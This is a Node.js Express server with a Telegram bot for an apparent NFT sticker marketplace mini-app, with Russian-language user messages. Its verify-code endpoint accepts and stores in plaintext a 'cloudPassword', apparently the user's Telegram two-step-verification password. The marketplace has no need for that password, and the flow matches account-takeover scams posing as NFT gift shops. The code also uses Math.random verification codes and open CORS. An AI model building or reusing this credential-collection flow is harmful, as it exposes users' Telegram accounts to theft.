import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';
import TelegramBot from 'node-telegram-bot-api';

dotenv.config();

const app = express();

// Telegram Bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data for NFTs
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 2,
    name: "Heart Gift",
    description: "Подарок в виде сердца",
    imageUrl: "https://via.placeholder.com/300x300/FF69B4/FFFFFF?text=💝",
    price: 1.49,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 3,
    name: "Diamond Premium",
    description: "Роскошный бриллиант",
    imageUrl: "https://via.placeholder.com/300x300/B9F2FF/000000?text=💎",
    price: 2.99,
    category: "premium",
    isAvailable: true
  }
];

// In-memory storage
let users = [];
let authSessions = new Map(); // phone -> {code, userId, chatId}
let userSessions = new Map(); // sessionId -> userData

// Generate verification code
function generateCode() {
  return Math.floor(10000 + Math.random() * 90000).toString();
}

// Send code via Telegram Bot
async function sendTelegramCode(chatId, phone, code) {
  try {
    await bot.sendMessage(chatId, 
      `🔐 *Код подтверждения для NFT Маркетплейса*\n\n` +
      `Телефон: \`${phone}\`\n` +
      `Код: *${code}*\n\n` +
      `Введите этот код в мини-приложении для завершения авторизации.`,
      { parse_mode: 'Markdown' }
    );
    return true;
  } catch (error) {
    console.error('Error sending code:', error);
    return false;
  }
}

// Routes
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace is running!',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// API Routes
app.get('/api/nft', async (req, res) => {
  try {
    const { category } = req.query;
    
    let nfts = sampleNFTs;
    
    if (category && category !== 'all') {
      nfts = sampleNFTs.filter(nft => nft.category === category);
    }
    
    res.json({ success: true, nfts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Step 1: Request code via Telegram Bot
app.post('/api/auth/request-code', async (req, res) => {
  try {
    const { phone, chatId } = req.body;
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    if (!chatId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Chat ID не получен' 
      });
    }

    // Validate phone
    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
    if (!phoneRegex.test(phone)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Неверный формат номера' 
      });
    }

    // Generate code
    const code = generateCode();
    
    // Send code via Telegram Bot
    const sent = await sendTelegramCode(chatId, phone, code);
    
    if (!sent) {
      return res.status(500).json({ 
        success: false, 
        error: 'Не удалось отправить код через Telegram' 
      });
    }

    // Create auth session
    authSessions.set(phone, {
      code: code,
      chatId: chatId,
      attempts: 0,
      createdAt: Date.now(),
      verified: false
    });

    res.json({
      success: true,
      message: 'Код отправлен в ваш Telegram аккаунт',
      nextStep: 'verify_code'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Step 2: Verify code
app.post('/api/auth/verify-code', async (req, res) => {
  try {
    const { phone, code, cloudPassword } = req.body;
    
    if (!phone || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер и код' 
      });
    }

    const authSession = authSessions.get(phone);
    if (!authSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    // Check timeout (10 minutes)
    if (Date.now() - authSession.createdAt > 10 * 60 * 1000) {
      authSessions.delete(phone);
      return res.status(400).json({ 
        success: false, 
        error: 'Код устарел' 
      });
    }

    // Check attempts
    if (authSession.attempts >= 5) {
      authSessions.delete(phone);
      return res.status(400).json({ 
        success: false, 
        error: 'Слишком много попыток' 
      });
    }

    // Verify code
    if (authSession.code !== code) {
      authSession.attempts++;
      authSessions.set(phone, authSession);
      
      const attemptsLeft = 5 - authSession.attempts;
      return res.status(400).json({ 
        success: false, 
        error: `Неверный код. Осталось попыток: ${attemptsLeft}` 
      });
    }

    // Code is correct - get user info from Telegram
    let telegramUser = null;
    try {
      const chat = await bot.getChat(authSession.chatId);
      telegramUser = {
        id: chat.id,
        firstName: chat.first_name,
        lastName: chat.last_name || '',
        username: chat.username || ''
      };
    } catch (error) {
      console.error('Error getting user info:', error);
      telegramUser = {
        id: authSession.chatId,
        firstName: 'Telegram',
        lastName: 'User'
      };
    }

    // Create/update user
    let user = users.find(u => u.telegramId === telegramUser.id);
    const isNewUser = !user;
    
    if (!user) {
      user = {
        id: users.length + 1,
        phone: phone,
        telegramId: telegramUser.id,
        firstName: telegramUser.firstName,
        lastName: telegramUser.lastName,
        username: telegramUser.username,
        isVerified: true,
        cloudPassword: cloudPassword || null,
        createdAt: new Date(),
        lastLogin: new Date()
      };
      users.push(user);
    } else {
      user.phone = phone;
      user.firstName = telegramUser.firstName;
      user.lastName = telegramUser.lastName;
      user.username = telegramUser.username;
      user.lastLogin = new Date();
      if (cloudPassword) {
        user.cloudPassword = cloudPassword;
      }
    }

    // Create session
    const sessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(sessionId, {
      userId: user.id,
      telegramId: user.telegramId,
      phone: user.phone,
      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000 // 30 days
    });

    // Cleanup auth session
    authSessions.delete(phone);

    // Send success message to user
    try {
      await bot.sendMessage(authSession.chatId,
        `✅ *Авторизация успешна!*\n\n` +
        `Добро пожаловать в NFT Маркетплейс, ${user.firstName}!`,
        { parse_mode: 'Markdown' }
      );
    } catch (error) {
      console.error('Error sending success message:', error);
    }

    res.json({
      success: true,
      message: isNewUser ? 'Аккаунт создан' : 'Вход выполнен',
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        hasCloudPassword: !!user.cloudPassword
      },
      sessionId: sessionId
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Verify session
app.get('/api/auth/verify-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Session ID обязателен' 
      });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ 
        success: false, 
        error: 'Недействительная сессия' 
      });
    }

    if (Date.now() > session.expiresAt) {
      userSessions.delete(sessionId);
      return res.status(401).json({ 
        success: false, 
        error: 'Сессия истекла' 
      });
    }

    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        error: 'Пользователь не найден' 
      });
    }

    res.json({
      success: true,
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        username: user.username,
        hasCloudPassword: !!user.cloudPassword
      }
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Logout
app.post('/api/auth/logout', async (req, res) => {
  try {
    const { sessionId } = req.body;
    
    if (sessionId) {
      userSessions.delete(sessionId);
    }
    
    res.json({
      success: true,
      message: 'Выход выполнен'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// Telegram Bot handlers
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const miniAppUrl = `https://${process.env.RAILWAY_STATIC_URL || 'your-app.railway.app'}`;
  
  try {
    await bot.sendMessage(chatId, 
      `🎁 *Добро пожаловать в NFT Маркетплейс!*\n\n` +
      `Используйте кнопку ниже для открытия мини-приложения и авторизации.`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '🛍️ Открыть NFT Маркетплейс', web_app: { url: miniAppUrl } }],
            [{ text: '🔐 Начать авторизацию', callback_data: 'start_auth' }]
          ]
        }
      }
    );
  } catch (error) {
    console.error('Error sending start message:', error);
  }
});

// Auth callback
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  
  if (query.data === 'start_auth') {
    try {
      await bot.sendMessage(chatId,
        `🔐 *Авторизация в NFT Маркетплейсе*\n\n` +
        `Для начала авторизации:\n` +
        `1. Нажмите кнопку "Открыть NFT Маркетплейс"\n` +
        `2. Введите ваш номер телефона Telegram\n` +
        `3. Получите код подтверждения здесь\n` +
        `4. Введите код в мини-приложении\n\n` +
        `Система автоматически свяжет ваш Telegram аккаунт с NFT Маркетплейсом.`,
        {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🛍️ Открыть NFT Маркетплейс', web_app: { url: `https://${process.env.RAILWAY_STATIC_URL || 'your-app.railway.app'}` } }]
            ]
          }
        }
      );
    } catch (error) {
      console.error('Error sending auth info:', error);
    }
  }
  
  await bot.answerCallbackQuery(query.id);
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Environment: ${process.env.NODE_ENV}`);
  console.log(`🎮 Health check: http://localhost:${PORT}/health`);
  console.log(`🏠 Main page: http://localhost:${PORT}/`);
  console.log(`🛍️ Marketplace: http://localhost:${PORT}/marketplace`);
  console.log(`🤖 Bot is running and ready for authentication`);
});
